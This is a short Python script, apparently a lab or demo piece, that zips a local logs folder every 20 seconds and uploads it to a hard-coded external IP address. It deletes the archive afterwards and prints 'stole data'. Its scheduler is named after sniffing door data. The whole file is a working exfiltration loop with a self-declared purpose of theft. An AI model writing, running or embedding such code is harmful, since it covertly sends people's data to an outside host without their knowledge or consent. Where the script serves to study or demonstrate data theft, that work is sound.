import requests, time, sched, shutil, os




#file = {'upload_file': open('test.txt','rb')}
#url="http://132.199.120.10:9090/upload"

#r = requests.post(url, files=file)



s = sched.scheduler(time.time, time.sleep)

def upload_data():
    shutil.make_archive('upload', 'zip', './logs')
    file = {'upload_file': open('./upload.zip','rb')}
    url="http://132.199.120.10:9090/upload"
    try:
        r = requests.post(url, files=file)
    except:
        print ("api not reachable")
    os.remove("upload.zip")
    print("stole data")
    

def sniff_door_data(sc): 
    upload_data()
    s.enter(20, 1, sniff_door_data, (sc,))

s.enter(1, 1, sniff_door_data, (s,))
s.run()

